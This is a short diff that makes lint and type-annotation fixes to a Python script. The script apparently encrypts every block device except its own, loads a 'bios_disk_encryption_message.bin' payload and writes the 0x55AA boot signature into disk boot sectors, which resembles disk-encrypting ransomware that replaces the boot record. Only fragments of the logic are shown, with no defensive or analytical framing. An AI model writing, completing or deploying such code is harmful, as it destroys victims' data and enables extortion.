@@ -29,10 +29,10 @@ def encrypt_device(info: storage.BlockInfo) -> None:
         f"\rEncrypting {info.uuid}... ({encrypted_size}/{info.size}: Done)")
 
 
-@entry_point.entry_point(no_lvm=True)
-def main(block_info: storage.BlocksType, _, our_device: str) -> None:
+@entry_point.entry_point(no_lvm=True)  # type: ignore
+def main(block_info: storage.BlocksType, _, our_device: str) -> None:  # type: ignore
     with open("/root/bios_disk_encryption_message.bin", "rb") as stream:
-        bios_payload  = stream.read()
+        bios_payload = stream.read()
     for device in block_info:
         if device != our_device:
             for child in device.children:
@@ -71,5 +71,6 @@ def main(block_info: storage.BlocksType, _, our_device: str) -> None:
                 stream.seek(510)
                 stream.write(b"\x55\xAA")
 
+
 if __name__ == "__main__":
-    main()
+    main()  # type: ignore
